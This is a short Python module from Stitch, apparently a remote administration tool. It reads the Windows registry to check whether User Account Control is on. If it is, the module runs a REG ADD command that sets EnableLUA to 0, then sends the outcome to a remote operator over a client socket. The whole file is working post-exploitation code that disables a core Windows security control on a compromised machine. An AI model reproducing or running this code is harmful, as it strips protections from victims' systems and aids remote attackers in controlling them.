# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

def disble_uac():
    return run_command("REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")

def check_uac():
    uac_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
    val=_winreg.QueryValueEx(uac_key, "EnableLUA")
    if val[0] == 1:
        return True
    else:
        return False

if check_uac():
    disble_uac()
    if check_uac():
        send(client_socket, "[!] Failed to Disable UAC, UAC is still Enabled\n")
    else:
        send(client_socket, "[+] UAC is now Disabled, reboot is required\n")
else:
    send(client_socket, "[*] UAC is already disabled.\n")
